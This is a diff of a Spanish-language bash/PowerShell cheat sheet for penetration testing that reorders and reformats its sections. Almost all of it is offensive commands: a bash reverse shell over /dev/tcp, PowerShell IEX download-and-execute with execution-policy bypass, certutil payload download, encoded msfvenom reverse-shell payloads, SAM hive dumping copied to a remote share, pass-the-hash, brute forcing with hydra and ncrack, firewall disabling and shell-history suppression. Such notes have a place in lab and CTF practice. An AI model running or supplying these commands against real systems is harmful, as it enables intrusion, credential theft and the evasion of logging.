@@ -1,6 +1,8 @@
 # Notas bash/powershell
 ### Ayuda memoria 
 
+![GitHub Logo](https://cloud.githubusercontent.com/assets/5456665/13322882/e74f6626-dc00-11e5-921d-f6d024a01eaa.png "GitHub")
+
 #### Powershell
 ---
 net user USUARIO PASSWORD /add --> *creación de usuario y contraseña*
@@ -13,7 +15,25 @@ copy \\IP\SHARE\FILE FILE
 
 plink.exe -l USUARIO -pw PASSWORD -R port:127.0.0.1:port
 
-#### Firewall-rules
+---
+$pass=convertto-securestring 'pass' -AsPlainText -Force
+
+$creds=New-Object System.Management.Automation.PSCredential('user', $pass)
+
+New-PSDrive -Name NAME -PSProvider FileSystem -Credential $creds -Root \\IP\COMPARTIDA
+
+cd COMPARTIDA:
+
+---
+powershell.exe -ep -Bypass -nop -noexit -c IEX"(New-Object Net.WebClient).downloadstring('http://ip/file')
+
+powershell.exe -c "(New-Object System.Net.Webclient).DownloadFile('http://ip/file', 'c:\Users\user\file')"
+
+Invoke-WebRequest "http://ip/file" -OutFile "c:\Users\file"
+
+certutil.exe -f -urlcache -split http://ip/file file
+
+#### Firewall
 ---
 netsh advfirewall firewall add rule name=NOMBRE_REGLA protocol=PROTO dir=in localport=PORT action=allow
 
@@ -23,17 +43,9 @@ netsh advfirewall firewall set allprofiles state off
 
 netsh advfirewall firewall delete rule name=NOMBRE_REGLA
 
-#### Activar-RDP vía CLI
+#### RDP
 ---
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-
-#### History
----
-export HISTTIMEFORMAT='%F %T '
-
-export HISTFILE=/dev/null
-
-shopt -s HISTAPPEND
 
 #### Bash
 ---
@@ -87,8 +99,6 @@ awk '{print "https://" $1}'
 
 awk '{print $1 ".yahoo.com"}'
 
-xargs -n1 -P10 ./sh
-
 ping -c ip -R --> *muestra ruta del ping hasta el destino*
 
 kill -9 $(jobs -p) 
@@ -111,13 +121,15 @@ xfreerdp /u:USUARIO /p:PASSWORD /size:1366x768 /f /v:10.16.22.103
 
 echo 'b64-string' | base64 -d | xxd -ps -r; echo
 
-echo !:2-3 --> *rango de argumentos
+echo !:2-3 --> *rango de argumentos*
 
-echo !$ --> *ultimo argumento
+echo !? --> *estado de salida del último comando*
 
-echo !^ --> *primer argumento
+echo !$ --> *ultimo argumento*
 
-echo !* --> *todos los argumentos
+echo !^ --> *primer argumento*
+
+echo !* --> *todos los argumentos*
 
 curlftpfs USUARIO:PASSWORD@IP $(pwd)
 
@@ -129,32 +141,39 @@ curl -U "USUARIO" --referer URL-SRC URL-DST
 
 openssl PASSWORD
 
-#### iptables
+#### History
 ---
+export HISTTIMEFORMAT='%F %T '
 
-iptables -I DOCKER-USER -i "int" -p tcp --dport "port" -j DROP --> *estado filtered 
+export HISTFILE=/dev/null
 
-iptables -A INPUT -i "int" -p tcp --dport "port" -j REJECT --> *estado closed
+shopt -s HISTAPPEND
 
-iptables -A INPUT -i "int" -p tcp --dport "port" -j REJECT --reject-with tcp-reset --> *estado closed y no aparece en escaneos
+#### Iptables
+---
+iptables -I DOCKER-USER -i "int" -p tcp --dport "port" -j DROP --> *estado filtered* 
+
+iptables -A INPUT -i "int" -p tcp --dport "port" -j REJECT --> *estado closed*
+
+iptables -A INPUT -i "int" -p tcp --dport "port" -j REJECT --reject-with tcp-reset --> *estado closed y no aparece en logs*
 
 iptables -A INPUT -p tcp --dport 80 -j ACCEPT
 
-iptables -A INPUT -s 192.168.1.104 -j ACCEPT --> *acepta solo tráfico de la siguiente IP
+iptables -A INPUT -s 192.168.1.104 -j ACCEPT --> *acepta solo tráfico de la siguiente IP*
 
-iptables -A INPUT -s 192.168.1.102 -j DROP --> *bloquea tráfico de la siguiente IP
+iptables -A INPUT -s 192.168.1.102 -j DROP --> *bloquea tráfico de la siguiente IP*
 
-iptables -A INPUT -p icmp -i eth0 -j DROP --> *bloqueo de ping en la interface
+iptables -A INPUT -p icmp -i eth0 -j DROP --> *bloqueo de ping en la interface*
 
 #### SSH
 ---
-ssh -R REMOTE_PORT:127.0.0.1:LOCAL_PORT user@REMOTE-IP -fNT --> para no abrir tty en equipo remoto
+ssh -R REMOTE_PORT:127.0.0.1:LOCAL_PORT user@REMOTE-IP -fNT --> *para no abrir tty en equipo remoto*
 
 ssh -L LOCAL_PORT:REMOTE_IP:REMOTE_PORT user@REMOTE-IP
 
-#### Host-recon
+#### Reconocimiento
 ---
-nmap -p1-10 IP --reason // muestra el estado del puerto 
+nmap -p1-10 IP --reason --> *muestra información de escaneo* 
 
 nmap --script="ssl*" IP
 
@@ -178,11 +197,11 @@ smbclient -L //IP/FOLDER --option='client min protocol=NT1' -N
 
 rpcclient -u '' -c "enumdomusers" -N
 
-#### Brute-force
+#### Fuerza bruta
 ---
 ncrack -vv -U "user.lst" -P "pass.lst" ip:port
 
-hydra -L "user.lst" -V -x '6:8aA1!@#$' ip ssh --> hydra crea su diccionario para ataque con números, min+may, simbolos
+hydra -L "user.lst" -V -x '6:8aA1!@#$' ip ssh --> *hydra crea su diccionario para ataque con números, min+may, simbolos*
 
 hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.137.91:21 -vV
 
@@ -200,13 +219,13 @@ zip2john 8702.zip
 
 fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt 8702.zip
 
-wfuzz -c -L --hc=404 -w WORDLIST TARGET --> L=recursivo 
+wfuzz -c -L --hc=404 -w WORDLIST TARGET --> *L=recursivo* 
 
 wfuzz -c --hc=404 -w WORDLIST -w WORDLIST2 url/FUZZ/FUZ2Z
 
 ffuf -c -w WORDLIST -u URL
 
-crunch 15 15 -t STRING+pattern --> pattern @lowercase ,uppercase %numbers ^symbols
+crunch 15 15 -t STRING+pattern --> *pattern @lowercase ,uppercase %numbers ^symbols*
 
 #### Samba-recon
 ---
@@ -246,27 +265,13 @@ pth-winexe -U domain/user%pass //IP CMD
 
 pth-winexe -U domain/user%hash //IP CMD
 
-#### Powershell shares
----
-PS> $pass=convertto-securestring 'pass' -AsPlainText -Force
-
-PS> $pass 
-
-PS> $creds=New-Object System.Management.Automation.PSCredential('user', $pass)
-
-PS> $creds 
-
-PS> New-PSDrive -Name NAME -PSProvider FileSystem -Credential $creds -Root \\IP\COMPARTIDA
-
-PS> cd COMPARTIDA:
-
-#### bash oneLiners
+#### Bash one-liners
 ---
 for i in admin dev test backup; do gobuster -u "url"/$i -w "wordlist" -t -o outputFile$i.txt; done
 
-for i in {1..20}; do curl http://192.168.46.5/users/$i 2>&1 | grep "s page</h1>" | cut -f2 -d '>' | cut -f1 -d \' ;done //enumeración de users
+for i in {1..20}; do curl http://192.168.46.5/users/$i 2>&1 | grep "s page</h1>" | cut -f2 -d '>' | cut -f1 -d \' ;done --> *enumeración de usuarios*
 
-for i in $(seq 1 10); do ping -c 1 mnba-biblio-0$i; done
+for i in $(seq 1 10); do ping -c 1 biblio-0$i; done
 
 for i in $(cat dictionario.lst); do echo $i; echo ${i}\!; done
 
@@ -276,7 +281,7 @@ while read SHAREDFOLDER; do echo "===${sharedFolder}==="; smbclient "//ip/${shar
 
 while read line;do echo $line; done | xargs ls -l
 
-#### SAM dump
+#### SAM
 ---
 reg save HKLM\SAM sam.backup
 
@@ -288,37 +293,27 @@ copy system.backup \\IP\smbfolder\system
 
 pwdump system sam
 
-#### tty upgrade
+#### Python TTY 
 ---
 python -c 'import pty; pty.spawn("/bin/bash")'
 
-V>ctrl-Z --> background sesion
+V>ctrl-Z --> *pone el proceso en background*
 
 A>stty size
 
 A>stty raw -echo
 
-A>fg 1 --> foreground sesion
+A>fg 1 --> *pone el proceso en primer plano*
 
 V>stty row "x" cols "x"
 
-#### tty-interactive
+#### TTY 
 ---
 script /dev/null -c  bash
 
 bash -i >& /dev/tcp/ip/puerto 0>&1
 
 mkfifo input; tail -f input | /bin/bash > output
-
-#### ShellPower
----
-powershell.exe -ep -Bypass -nop -noexit -c IEX"(New-Object Net.WebClient).downloadstring('http://ip/file')
-
-powershell.exe -c "(New-Object System.Net.Webclient).DownloadFile('http://ip/file', 'c:\Users\user\file')"
-
-Invoke-WebRequest "http://ip/file" -OutFile "c:\Users\file"
-
-certutil.exe -f -urlcache -split http://ip/file file
 
 #### php
 ---
@@ -336,15 +331,15 @@ tmux new -s "nombre"
 
 tmux kill-window -t "n"
 
-prefix + space --> mueve los paneles
+prefix + space --> *mueve los paneles*
 
-prefix + q --> muestra los IDs de los paneles
+prefix + q --> *muestra los IDs de los paneles*
 
-prefix + x --> cierra los paneles
+prefix + x --> *cierra los paneles*
 
-prefix + ! --> mueve el panel activo a una nueva ventana
+prefix + ! --> *mueve el panel activo a una nueva ventana*
 
-prefix + [ + / --> para buscar texto
+prefix + [ --> *para buscar texto*
 
 #### Tmux copy mode
 ---
@@ -356,13 +351,14 @@ prefix + w
 
 prefix + ]
 
-
 #### msfvenom
+---
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=IP -e x86/shikata_ga_nai -i 10 -f raw > FILE.bin
 
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=IP -f raw
 
 #### mysql
+---
 mysql -u USER -p PASS -P CMD
 
 mysqlshow -u USER -p PASS DATABASE TABLES
